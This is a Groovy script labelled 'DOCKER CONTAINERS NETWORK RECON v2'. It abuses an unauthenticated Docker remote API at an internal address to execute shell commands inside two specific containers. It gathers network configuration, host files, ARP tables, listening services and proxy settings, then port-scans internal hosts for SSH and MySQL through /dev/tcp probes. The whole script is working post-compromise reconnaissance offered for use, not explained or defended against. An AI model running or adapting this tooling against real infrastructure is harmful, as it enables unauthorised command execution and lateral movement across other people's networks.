import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dockerApi = "http://172.27.140.148:4243"
def containers = ["5b32e909c295", "3b389d5bf116"]

def httpReq(String method, String url, String body = null) {
    try {
        def conn = new URL(url).openConnection()
        conn.requestMethod = method
        conn.connectTimeout = 5000
        conn.readTimeout = 15000
        if (body) {
            conn.doOutput = true
            conn.setRequestProperty('Content-Type', 'application/json')
            conn.outputStream.write(body.getBytes('UTF-8'))
        }
        return conn.inputStream.text
    } catch (e) {
        try { return conn.errorStream?.text ?: "ERR:${e.message}" }
        catch (e2) { return "ERR:${e.message}" }
    }
}

def dockerExec(String cid, String cmd, String api) {
    def createBody = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ['sh', '-c', cmd]])
    def resp = httpReq('POST', "${api}/containers/${cid}/exec", createBody)
    def js = new JsonSlurper()
    def parsed = js.parseText(resp)
    if (!parsed?.Id) return "EXEC_FAIL: ${resp}"
    def execId = parsed.Id
    def startBody = JsonOutput.toJson([Detach: false, Tty: false])
    def output = httpReq('POST', "${api}/exec/${execId}/start", startBody)
    return output?.replaceAll('[\\x00-\\x08]', '')?.trim() ?: "EMPTY"
}

println "=== DOCKER CONTAINERS NETWORK RECON v2 ==="
println "API: ${dockerApi}"
println ""

containers.each { cid ->
    println "====== CONTAINER: ${cid} ======"
    
    println "--- hostname ---"
    println dockerExec(cid, "hostname", dockerApi)
    
    println "--- ip addr ---"
    println dockerExec(cid, "ip addr show 2>/dev/null || ifconfig 2>/dev/null || cat /proc/net/if_inet6", dockerApi)
    
    println "--- ip route ---"
    println dockerExec(cid, "ip route show 2>/dev/null || route -n 2>/dev/null || cat /proc/net/route", dockerApi)
    
    println "--- /etc/hosts ---"
    println dockerExec(cid, "cat /etc/hosts", dockerApi)
    
    println "--- /etc/resolv.conf ---"
    println dockerExec(cid, "cat /etc/resolv.conf", dockerApi)
    
    println "--- arp ---"
    println dockerExec(cid, "arp -a 2>/dev/null || ip neigh show 2>/dev/null || cat /proc/net/arp", dockerApi)
    
    println "--- listening ---"
    println dockerExec(cid, "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || cat /proc/net/tcp | head -30", dockerApi)
    
    println "--- env proxy ---"
    println dockerExec(cid, "env | grep -i proxy || echo NO_PROXY", dockerApi)
    
    println "--- tcp probe targets ---"
    println dockerExec(cid, """
for target in 172.27.141.24:3308 172.27.141.4:3310 172.27.141.21:8080 172.27.141.24:22 172.27.141.4:22 172.27.141.1:22 172.27.140.148:4243 172.27.141.24:3306 172.27.141.4:3306 172.26.84.1:22; do
  ip=\$(echo \$target | cut -d: -f1)
  port=\$(echo \$target | cut -d: -f2)
  timeout 2 bash -c "echo > /dev/tcp/\$ip/\$port" 2>/dev/null && echo "OPEN \$target" || echo "CLOSED \$target"
done
""", dockerApi)
    
    println ""
}

println "=== END DOCKER RECON ==="
